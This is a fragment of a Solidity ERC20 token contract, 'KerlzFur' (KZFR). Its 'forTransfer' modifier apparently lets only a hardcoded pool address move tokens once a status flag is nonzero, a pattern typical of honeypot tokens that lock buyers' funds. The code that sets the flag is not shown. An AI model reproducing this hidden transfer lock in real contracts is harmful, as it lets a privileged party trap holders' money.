...
contract KerlzFurToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenKF_totalSupply;
    uint256 private _tokenKF_status = 0;
    uint256 public stakingPoolKFStatus = 0;

    string private _tokenKF_name;
    string private _tokenKF_symbol;

    address private _poolKFAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenKF_name = "KerlzFur";
        _tokenKF_symbol = "KZFR";
        _tokenKF_totalSupply = 94500 * 10 ** 18;
        _balances[msg.sender] = _tokenKF_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolKFAddress || _tokenKF_status == 0);
        _;
    }
